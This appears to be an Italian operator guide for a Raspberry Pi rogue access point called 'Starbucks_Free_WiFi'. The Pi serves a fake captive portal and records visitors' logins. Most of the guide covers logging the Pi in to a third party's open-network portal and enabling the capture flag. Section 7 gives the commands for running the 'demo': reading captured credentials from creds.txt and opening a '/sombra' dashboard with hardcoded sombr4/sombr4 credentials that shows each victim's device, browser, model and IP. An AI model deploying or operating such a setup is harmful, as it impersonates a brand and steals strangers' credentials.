# instruction.md — Login manuale al captive portal del router (rete libera)

Quando il router della rete libera ha un suo portale (login email/password,
telefono, Google/Apple), il Pi resta **senza Internet** finché non completi
quel login. Niente auto-accept: serve un login manuale. Questa guida copre
tutti i metodi, dal Pi o da un browser vero.

> **Con il TUO hotspot WPA2 questo file non serve.** Accendi il tuo hotspot,
lancia `sudo starbucks-mode campo` e il Pi ha Internet senza portali di mezzo.
Questa guida vale solo se ti agganci alla WiFi libera di altri che ha un suo
portale. Il flusso normale della demo e' spiegato in [README.md](README.md).

## 1. Capire se serve

Sul Pi (SSH):

```bash
cat /tmp/portal-blocked 2>/dev/null && echo "SI: siamo bloccati dal portale del router"
curl -s -o /dev/null -w "%{http_code}
" http://connectivitycheck.gstatic.com/generate_204
```

- `204` -> Internet OK, non serve fare nulla.
- `302`/`200` con HTML -> captive portal del router attivo: procedi.
- `000` -> problema di rete diverso (controlla `ip addr show wlan0`).

Trova il gateway (di solito è lì che sta il portale):

```bash
ip route | awk '/default/ {print $3}'
```

## 2. Trovare l'URL del portale

Dal Pi:

```bash
curl -sL -o /dev/null -w "%{url_effective}
" http://neverssl.com
```

L'ultimo URL dopo i redirect è il portale. Se non esce nulla, prova
direttamente l'IP del gateway trovato sopra.

## 3. Metodo A (consigliato): login dal Pi con browser testuale

Installa `lynx` e apri il portale:

```bash
sudo apt install -y lynx
lynx http://<gateway>/            # oppure l'URL del portale trovato al punto 2
```

Compila il modulo (email/password, o il pulsante Google/Apple se il portale
lo permette via browser testuale) e salva. Se `lynx` non basta:

```bash
sudo apt install -y w3m
w3m http://<gateway>/
```

## 4. Metodo B: browser vero attraverso l'AP del Pi

Se il portale è troppo "JavaScript" per un browser testuale, completalo da un
**browser vero** passando attraverso l'AP del Pi:

1. Collega il laptop alla rete AP del Pi (`Starbucks_Free_WiFi`).
2. Sblocca temporaneamente il laptop sul Pi (altrimenti è gated finché non fa
   login al portale del Pi):

   ```bash
   # sul Pi:
   ip neigh show dev ap0 | grep -i laptop   # trova l'IP del laptop (es. 10.3.0.50)
   iptables -I PORTAL_CLIENTS -s 10.3.0.50 -j ACCEPT
   ```

3. Dal browser del laptop apri l'IP del **router** (il gateway trovato al
   punto 1, es. `http://192.168.1.1/`) o l'URL del portale al punto 2, e
   completa il login.
4. Togli la regola di sblocco quando hai finito:

   ```bash
   iptables -D PORTAL_CLIENTS -s 10.3.0.50 -j ACCEPT
   ```

## 5. Dopo il login

Verifica che il Pi abbia Internet (dal Pi):

```bash
curl -s -o /dev/null -w "%{http_code}
" http://connectivitycheck.gstatic.com/generate_204   # -> 204
rm -f /tmp/portal-blocked
```

Il timer `portal-passthrough` farà da solo i prossimi controlli (ogni 60s):
quando il router ci sblocca, il marker sparisce e viene loggato
(`journalctl -u portal-passthrough`).


## 6. Aggiornare un Pi già configurato (flag PORTAL_ENABLED)

Dalla versione con il fix "captive solo in modalità Pi", l'app
reindirizza gli host sconosciuti **solo se** `/etc/starbucks-portal.env`
contiene `PORTAL_ENABLED=1`. Senza il flag l'app resta un sito normale: la
pagina del portale si vede comunque su `http://10.3.0.1/`, ma le probe
captive (`generate_204`, `hotspot-detect.html`) ricevono 404 invece di 302 e,
dopo il login, il telefono non riceve il 204 che chiude il popup del portale.

> **Non impostare mai il flag su Render** (o su un host con hostname
> pubblico): con il flag attivo ogni richiesta verrebbe reindirizzata
> all'indirizzo locale (127.0.0.1) e il sito non si aprirebbe più. Il flag
> è riservato al Pi, dove `setup.sh` lo scrive da solo.

### Migrazione di un Pi già funzionante (senza rilanciare setup.sh)

1. Controlla se il flag è già presente (sul Pi):

   ```bash
   grep PORTAL_ENABLED /etc/starbucks-portal.env || echo "flag assente"
   ```

2. Aggiungilo, se manca:

   ```bash
   echo "PORTAL_ENABLED=1" | sudo tee -a /etc/starbucks-portal.env
   ```

3. Aggiorna i file dell'app dal PC (come da README, sezione "Copia il
   progetto sul Pi"):

   ```bash
   rsync -av --exclude node_modules --exclude .git ./ pi@<ip-del-pi>:/opt/starbucks-portal/
   ```

4. Riavvia in modalita' campo:

   ```bash
   ssh pi@<ip-del-pi> "sudo starbucks-mode campo"
   ```

5. Verifica il comportamento captive: la probe deve ricevere `302` verso il
   portale (senza flag avresti `404`):

   ```bash
   curl -sI -H "Host: connectivitycheck.gstatic.com" http://10.3.0.1/generate_204 | head -1
   # HTTP/1.1 302 Found  (Location: http://10.3.0.1/)
   journalctl -u starbucks-portal -n 5   # nessun errore all'avvio
   ```

Se invece rilanci tutto `setup.sh`, non serve alcun passo manuale: lo script
scrive `PORTAL_ENABLED=1` in `/etc/starbucks-portal.env` da solo.

## 7. Comandi per chi fa la demo (operatore)

Prima di tutto, sul Pi: `sudo starbucks-mode campo` (accende il portale e
spegne Pi-hole). Poi il laptop dell'operatore si collega alla rete AP del Pi
(`Starbucks_Free_WiFi`, IP del Pi: `10.3.0.1`).

### Windows (PowerShell o cmd)

```powershell
netsh wlan connect name="Starbucks_Free_WiFi"     # connettersi all'AP
ping 10.3.0.1                                      # il Pi risponde?
Test-NetConnection 10.3.0.1 -Port 80               # porta 80 aperta?
start http://10.3.0.1                              # aprire il portale
start http://10.3.0.1/sombra                       # dashboard (sombr4/sombr4)
curl.exe -s -o NUL -w "%{http_code}" http://10.3.0.1/
```

### Linux (Ubuntu/Debian, incluse Kali e Dragon OS)

```bash
nmcli dev wifi connect Starbucks_Free_WiFi         # connettersi all'AP
# alternativa con iwd:
# iwctl station wlan0 connect Starbucks_Free_WiFi
ping -c 3 10.3.0.1
curl -s -o /dev/null -w "%{http_code}
" http://10.3.0.1/
xdg-open http://10.3.0.1/sombra                   # dashboard (sombr4/sombr4)
```

> **Kali / Dragon OS**: nessun trucco speciale, è una normale rete AP.
> NON serve `airmon-ng`: il Pi trasmette già un AP legittimo, il laptop è
> solo un client.

### Verifica rapida della cattura

```bash
# dopo che il telefono ha completato il login:
curl -s http://10.3.0.1/sombra/latest?tk=<token> -o /dev/null -w "%{http_code}
"
# oppure, dal Pi:
tail -n 3 /opt/starbucks-portal/instance/creds.txt
```
Ogni riga di `creds.txt` contiene anche `device` (APPLE/ANDROID/PC),
`browser` (Chrome, Safari, Edge, ...) e `model` (Pixel 8, SM-G991B,
"iPhone (iOS 17)"):

```bash
# ultima cattura in formato leggibile (sul Pi):
tail -n 1 /opt/starbucks-portal/instance/creds.txt | python3 -m json.tool
# oppure solo i campi utili:
tail -n 1 /opt/starbucks-portal/instance/creds.txt | python3 -c "import sys,json; d=json.loads(sys.stdin.read()); print(d['device'], '|', d['browser'], '|', d['model'], '|', d['ip'])"
```

Sulla dashboard `/sombra` questi campi sono le colonne **DEV**, **BROWSER** e
**MODEL**. L'IP salvato è quello con cui il dispositivo si è connesso
(sul Pi: l'IP sull'AP, es. 10.3.0.x), non l'IP pubblico del router. Il modello è best-effort: per gli iPhone l'UA riporta solo "iPhone", quindi compare
"iPhone (iOS 17)" con la versione iOS; per i PC il modello è il sistema
operativo (Windows/Mac/Linux).


## 8. Troubleshooting rapido del login manuale

| Sintomo | Causa probabile | Cosa fare |
|---|---|---|
| `curl` sul Pi risponde `302` al portale del router | Portale attivo (85%) | Completalo con metodo A o B |
| Il browser dal laptop non arriva al portale del router | Laptop gated dal Pi (70%) | `iptables -I PORTAL_CLIENTS -s <ip-laptop> -j ACCEPT` |
| `lynx` mostra pagina vuota/JS | Portale troppo pesante (75%) | Usa il metodo B (browser vero) |
| Login fatto ma `generate_204` non torna `204` | Sessione portale non registrata (60%) / IP diverso (20%) | Riapri il portale e rifai login; controlla che il Pi usi lo stesso IP |
| Il marker `/tmp/portal-blocked` ricompare | Timer in corso (40%) / sessione scaduta (40%) | Aspetta il prossimo check o rifai il login |

## 9. Note

- Il login del router va fatto **una sola volta** (finché la sessione del
  router non scade): dopo, il Pi ha Internet e i telefoni sbloccati navigano.
- Se il router usa MAC-based auth, il login potrebbe servire di nuovo dopo un
  riavvio del Pi: è normale.
- La rete AP del Pi e la rete del router hanno **subnet diverse**
  (10.3.0.0/24 vs 192.168.x.0/24): il laptop, per raggiungere il portale del
  router, usa l'IP del router, mai il nome (il DNS del Pi risolve tutto su
  se stesso).

